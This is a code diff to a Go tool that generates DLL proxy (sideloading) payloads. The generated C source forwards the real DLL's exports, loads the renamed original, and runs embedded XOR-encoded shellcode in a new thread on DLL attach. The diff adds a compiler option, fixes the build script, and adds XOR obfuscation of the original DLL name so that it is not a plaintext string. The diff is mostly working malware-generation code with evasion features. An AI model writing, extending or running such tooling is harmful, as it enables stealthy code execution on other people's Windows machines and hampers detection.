@@ -20,6 +20,7 @@ type Config struct {
 	Arch        string // "x64" (default) or "x86"
 	XOR         bool   // XOR-encode the embedded shellcode with a random key
 	Build       bool   // compile the proxy DLL with mingw immediately
+	Compiler    string // optional mingw compiler path (overrides arch default)
 }
 
 // Generate emits proxy.c, <name>.def, and a build script into OutDir.
@@ -76,13 +77,13 @@ func Generate(cfg Config) ([]string, error) {
 	if err := os.WriteFile(defPath, []byte(genDef(base, cfg.RenameBase, exports)), 0644); err != nil {
 		return nil, err
 	}
-	if err := os.WriteFile(buildPath, []byte(genBuild(base, cfg.Arch)), 0644); err != nil {
+	if err := os.WriteFile(buildPath, []byte(genBuild(base, cfg.RenameBase, cfg.Arch, cfg.Compiler)), 0644); err != nil {
 		return nil, err
 	}
 
 	files := []string{cPath, defPath, buildPath}
 	if cfg.Build {
-		dllPath, err := buildProxy(cfg.OutDir, base, cfg.Arch)
+		dllPath, err := buildProxy(cfg.OutDir, base, cfg.Arch, cfg.Compiler)
 		if err != nil {
 			return files, err
 		}
@@ -92,10 +93,13 @@ func Generate(cfg Config) ([]string, error) {
 }
 
 // buildProxy compiles proxy.c + <name>.def into <name>.dll using mingw.
-func buildProxy(outDir, base, arch string) (string, error) {
-	cc := "x86_64-w64-mingw32-gcc"
-	if arch == "x86" {
-		cc = "i686-w64-mingw32-gcc"
+func buildProxy(outDir, base, arch, compiler string) (string, error) {
+	cc := compiler
+	if cc == "" {
+		cc = "x86_64-w64-mingw32-gcc"
+		if arch == "x86" {
+			cc = "i686-w64-mingw32-gcc"
+		}
 	}
 	ccPath, err := exec.LookPath(cc)
 	if err != nil {
@@ -153,16 +157,41 @@ func genC(payload, key []byte, renameBase string) string {
 	sb.WriteString("    }\n")
 	sb.WriteString("    return 0;\n")
 	sb.WriteString("}\n\n")
+	if renameBase != "" {
+		writeObfuscatedName(&sb, renameBase+".dll")
+	}
 	sb.WriteString("BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {\n")
 	sb.WriteString("    if (fdwReason == DLL_PROCESS_ATTACH) {\n")
 	if renameBase != "" {
-		fmt.Fprintf(&sb, "        LoadLibraryA(\"%s.dll\");\n", renameBase)
+		sb.WriteString("        decode_name();\n")
+		sb.WriteString("        LoadLibraryA((char*)orig_name);\n")
 	}
 	sb.WriteString("        CreateThread(NULL, 0, run, NULL, 0, NULL);\n")
 	sb.WriteString("    }\n")
 	sb.WriteString("    return TRUE;\n")
 	sb.WriteString("}\n")
 	return sb.String()
+}
+
+// writeObfuscatedName emits an XOR-encoded C string (single random key) plus a
+// decode_name() helper, so the original DLL name isn't a plaintext string in the
+// generated source.
+func writeObfuscatedName(sb *strings.Builder, name string) {
+	key := byte(0)
+	for key == 0 {
+		b := make([]byte, 1)
+		rand.Read(b)
+		key = b[0]
+	}
+	sb.WriteString("unsigned char orig_name[] = {\n  ")
+	for i := 0; i < len(name); i++ {
+		if i > 0 {
+			sb.WriteString(" ")
+		}
+		fmt.Fprintf(sb, "0x%02x,", name[i]^key)
+	}
+	sb.WriteString(" 0x00\n};\n")
+	fmt.Fprintf(sb, "void decode_name(void) {\n    for (unsigned int i = 0; i < sizeof(orig_name) - 1; i++) orig_name[i] ^= 0x%02x;\n}\n\n", key)
 }
 
 func writeByteArray(sb *strings.Builder, data []byte) {
@@ -206,12 +235,15 @@ func genDef(base, renameBase string, exports []pe.Export) string {
 	return sb.String()
 }
 
-func genBuild(base, arch string) string {
-	cc := "x86_64-w64-mingw32-gcc"
-	if arch == "x86" {
-		cc = "i686-w64-mingw32-gcc"
+func genBuild(base, renameBase, arch, compiler string) string {
+	cc := compiler
+	if cc == "" {
+		cc = "x86_64-w64-mingw32-gcc"
+		if arch == "x86" {
+			cc = "i686-w64-mingw32-gcc"
+		}
 	}
 	return fmt.Sprintf(
 		"@echo off\nREM 1) rename the real %[1]s.dll to %[2]s.dll\nREM 2) run this script to build the proxy %[1]s.dll\n%[3]s -shared -o %[1]s.dll proxy.c %[1]s.def\n",
-		base, base+"_orig", cc)
+		base, renameBase, cc)
 }
